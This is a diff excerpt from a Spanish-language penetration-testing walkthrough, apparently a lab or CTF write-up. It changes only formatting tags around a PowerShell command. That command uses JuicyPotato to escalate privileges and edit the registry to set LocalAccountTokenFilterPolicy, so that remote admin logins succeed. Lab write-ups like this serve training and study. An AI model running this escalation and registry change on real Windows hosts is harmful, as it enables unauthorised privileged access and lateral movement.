@@ -120,13 +120,9 @@ Si intentamos checkear el logeo con `netexec` para ver si sale la flag "(Pwned!)
 
 Vamos a editar el registro para permitirlo con:
 
-{% code overflow="wrap" %}
-
 ```powershell
 JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
 ```
-
-{% endcode %}
 
 Y ahora veremos la flag (Pwned!)
 
